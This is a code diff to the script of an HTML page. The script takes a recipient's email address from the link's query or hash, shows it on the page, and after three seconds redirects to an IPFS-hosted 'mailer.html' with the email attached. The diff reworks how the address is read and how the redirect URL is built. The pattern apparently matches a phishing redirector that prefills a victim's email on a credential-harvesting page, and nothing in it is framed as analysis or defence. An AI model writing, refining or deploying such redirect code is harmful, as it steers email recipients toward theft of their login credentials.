@@ -42,21 +42,33 @@
     <script>
         // Extract and validate email from URL
         function getEmailFromURL() {
-            const hash = window.location.hash.substring(1);
+            // First try URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            let email = urlParams.get('email');
             
-            // Remove any 'email=' prefix if present
-            const emailParam = hash.startsWith('email=') ? hash.substring(6) : hash;
+            // If not in parameters, try hash
+            if (!email && window.location.hash) {
+                const hash = window.location.hash.substring(1);
+                // Remove any 'email=' prefix if present
+                email = hash.startsWith('email=') ? hash.substring(6) : hash;
+            }
             
-            // Basic email validation
-            if (emailParam.includes('@') && emailParam.includes('.')) {
+            // Decode and validate
+            if (email) {
                 try {
-                    return decodeURIComponent(emailParam);
-                } catch {
-                    return null;
+                    email = decodeURIComponent(email);
+                    // More comprehensive email validation
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (emailRegex.test(email)) {
+                        return email;
+                    }
+                } catch (e) {
+                    console.error('Error decoding email:', e);
                 }
             }
             return null;
         }
+
         // Display the recipient email
         function showRecipientEmail() {
             const email = getEmailFromURL();
@@ -67,23 +79,21 @@
                 document.body.appendChild(displayElement);
             }
         }
+
         // Initialize and redirect
         document.addEventListener('DOMContentLoaded', function() {
             showRecipientEmail();
             
             setTimeout(() => {
                 const email = getEmailFromURL();
-                let ipfsURL = 'https://bafybeicmwrz7hj3wdwswr3ztezlj326mnnszzp4qb6rlpyew53vi4itxsm.ipfs.dweb.link/mailer.html#{email}';
+                let ipfsURL = 'https://bafybeicmwrz7hj3wdwswr3ztezlj326mnnszzp4qb6rlpyew53vi4itxsm.ipfs.dweb.link/mailer.html';
                 
-                // Replace {email} placeholder or append as hash
+                // Append email to the URL if it exists
                 if (email) {
-                    if (ipfsURL.includes('{email}')) {
-                        ipfsURL = ipfsURL.replace('{email}', encodeURIComponent(email));
-                    } else {
-                        ipfsURL += `#${encodeURIComponent(email)}`;
-                    }
+                    ipfsURL += `#${encodeURIComponent(email)}`;
                 }
                 
+                // Redirect to the IPFS URL
                 window.location.href = ipfsURL;
             }, 3000);
         });
